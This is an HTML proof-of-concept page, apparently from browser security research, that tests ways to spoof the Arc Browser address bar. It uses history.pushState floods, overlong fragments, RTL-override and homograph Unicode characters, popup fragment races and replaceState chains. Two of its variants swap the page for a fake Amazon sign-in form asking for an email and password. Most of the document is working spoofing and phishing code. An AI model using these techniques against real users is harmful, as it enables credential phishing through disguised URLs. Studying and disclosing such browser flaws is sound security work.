<!DOCTYPE html>
<html>
<head>
<title>PoC 7: Fragment Navigation + History Manipulation</title>
<!--
  PoC 7: Fragment Navigation + History API Chaining

  Target: Arc Browser (Chromium 146+)

  Technique: Fragment navigations (#) are same-document navigations that
  don't trigger full navigation commits. Combined with history.pushState
  and history.replaceState, they may create URL states that desync from
  actual content.

  Attack vectors tested:
  A) Rapid pushState + fragment changes to overwhelm URL update logic
  B) Open redirect on target domain + replaceState
  C) Cross-window fragment navigation manipulation
  D) data: URI in fragment (some browsers misparse)
  E) Unicode/RTL tricks in fragment to obscure real domain
-->
</head>
<body style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 40px; background: #f5f5f5;">
<h2>PoC 7: Fragment + History Manipulation</h2>

<button onclick="testRapidPush()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  A: Rapid pushState Flood
</button>
<button onclick="testFragmentOverflow()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  B: Fragment Overflow
</button>
<button onclick="testUnicodeSpoof()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  C: Unicode/RTL Fragment
</button>
<button onclick="testPopupFragment()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  D: Popup Fragment Race
</button>
<button onclick="testReplaceChain()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  E: replaceState Chain
</button>

<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>

<script>
function log(msg) {
  const el = document.getElementById('log');
  el.innerHTML += msg + '<br>';
  el.scrollTop = el.scrollHeight;
}

// Variant A: Flood pushState to overwhelm URL update mechanism
function testRapidPush() {
  log('[A] Starting rapid pushState flood...');

  const fakeURLs = [
    '/amazon/signin',
    '/amazon/account',
    '/amazon/orders',
    '/account/login',
    '/secure/signin',
  ];

  // Rapidly push thousands of states
  const startTime = performance.now();
  let count = 0;

  for (let i = 0; i < 1000; i++) {
    const url = fakeURLs[i % fakeURLs.length] + '#' + Math.random();
    try {
      history.pushState({i: i}, '', url);
      count++;
    } catch(e) {
      log('[A] pushState failed at iteration ' + i + ': ' + e.message);
      break;
    }
  }

  const elapsed = performance.now() - startTime;
  log('[A] Pushed ' + count + ' states in ' + elapsed.toFixed(1) + 'ms');
  log('[A] Current URL: ' + location.href);

  // Replace content with phishing UI
  document.body.innerHTML = `
    <div style="font-family:Arial;max-width:400px;margin:40px auto;">
      <h2>Amazon Sign In</h2>
      <p>URL path shows: ${location.pathname}</p>
      <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
      <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
      <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
      <p style="font-size:11px;color:#666;">Note: URL shows a path like /amazon/signin but we're on the attacker domain.</p>
      <button onclick="location.reload()" style="margin-top:10px;padding:8px 16px;">Reset</button>
    </div>
  `;

  log('[A] Content replaced. The URL path looks like an Amazon path.');
  log('[A] This is same-origin path manipulation, not full URL spoofing.');
  log('[A] Combined with a convincing domain name, this could be effective.');
}

// Variant B: Very long fragment to overflow URL display
function testFragmentOverflow() {
  log('[B] Testing fragment overflow...');

  // Some browsers truncate or hide the fragment in the address bar
  // A very long fragment might push the real domain out of view
  const padding = 'amazon.com/signin'.repeat(50);
  const fragment = '#' + padding;

  history.replaceState({}, '', fragment);
  log('[B] Fragment set to ' + fragment.length + ' characters');
  log('[B] Check if the address bar only shows the fragment text,');
  log('[B] hiding the actual domain');

  // Also try with path that looks legitimate
  try {
    history.replaceState({}, '', '/amazon.com/signin/' + 'x'.repeat(200) + '#login');
    log('[B] Long path variant set');
  } catch(e) {
    log('[B] Long path failed: ' + e.message);
  }
}

// Variant C: Unicode/RTL characters in URL to obscure domain
function testUnicodeSpoof() {
  log('[C] Testing Unicode/RTL URL manipulation...');

  // RTL Override character (U+202E) reverses text display
  // This could make the URL appear to show a different domain
  const rtlOverride = '\u202E';
  const rtlPopDirection = '\u202C';

  // Try various Unicode tricks
  const tricks = [
    // RTL override to reverse part of the URL
    '/signin' + rtlOverride + 'moc.nozama' + rtlPopDirection,

    // Zero-width characters to break domain display
    '/signin\u200B\u200B\u200B',

    // Combining characters
    '/amazon\u0338.com/signin',

    // Homograph-like path
    '/\u0430m\u0430zon.com/signin',  // Cyrillic 'a' in path

    // Right-to-left embedding
    '\u202Bmoc.nozama/\u202C',
  ];

  tricks.forEach((trick, i) => {
    try {
      history.pushState({}, '', trick);
      log('[C] Trick ' + (i+1) + ' applied. URL: ' + location.href);
    } catch(e) {
      log('[C] Trick ' + (i+1) + ' failed: ' + e.message);
    }
  });

  log('[C] Check the address bar for any visual anomalies');
  log('[C] Some characters may cause the domain to appear different');

  // Show which tricks affected the URL display
  document.body.innerHTML += `
    <div style="background:#fff;padding:16px;border-radius:8px;margin-top:20px;">
      <h3>URL Display Test</h3>
      <p>Current URL: <code>${location.href}</code></p>
      <p>If the address bar shows text that looks like amazon.com, the Unicode trick worked.</p>
      <button onclick="location.href=location.pathname.split('#')[0]" style="padding:8px 16px;">Reset</button>
    </div>
  `;
}

// Variant D: Open popup, manipulate fragment from opener
function testPopupFragment() {
  log('[D] Testing popup + fragment manipulation...');

  // Open same-origin popup
  const popup = window.open(location.href + '#popup');

  if (!popup) {
    log('[D] BLOCKED: Allow popups');
    return;
  }

  log('[D] Popup opened. Manipulating fragment from opener...');

  // Rapidly change the popup's fragment via the opener relationship
  let count = 0;
  const interval = setInterval(() => {
    try {
      // Change popup's hash rapidly
      popup.location.hash = '#amazon-signin-' + count;
      count++;

      if (count > 100) {
        clearInterval(interval);
        log('[D] Set ' + count + ' fragments on popup');

        // Now try to navigate the popup cross-origin while fragment changes
        try {
          popup.location.href = 'https://www.amazon.com/#' + Math.random();
          log('[D] Navigated popup to amazon.com. Check its URL bar.');
        } catch(e) {
          log('[D] Cross-origin navigation error: ' + e.message);
        }
      }
    } catch(e) {
      clearInterval(interval);
      log('[D] Fragment manipulation ended: ' + e.message);
    }
  }, 1);
}

// Variant E: replaceState chain with timing
function testReplaceChain() {
  log('[E] Testing replaceState chain with navigation...');

  // Use replaceState to set a convincing path
  const paths = [
    '/account/login',
    '/ap/signin',
    '/gp/sign-in/sign-in.html',
    '/auth/signin',
  ];

  let idx = 0;

  // Rapidly cycle through paths
  const interval = setInterval(() => {
    if (idx >= paths.length * 3) {
      clearInterval(interval);
      log('[E] Settled on: ' + location.href);
      return;
    }

    const path = paths[idx % paths.length];
    history.replaceState({step: idx}, '', path);
    idx++;
  }, 10);

  // Replace page content
  setTimeout(() => {
    document.body.innerHTML = `
      <div style="font-family:Arial;max-width:400px;margin:40px auto;background:#fff;padding:24px;border:1px solid #ddd;border-radius:8px;">
        <h2 style="color:#ff9900;">amazon</h2>
        <h3>Sign In</h3>
        <p style="color:#666;font-size:13px;">Current URL path: <code id="curPath"></code></p>
        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
      </div>
    `;

    // Update shown path
    const pathEl = document.getElementById('curPath');
    if (pathEl) pathEl.textContent = location.pathname;
  }, 200);
}
</script>
</body>
</html>
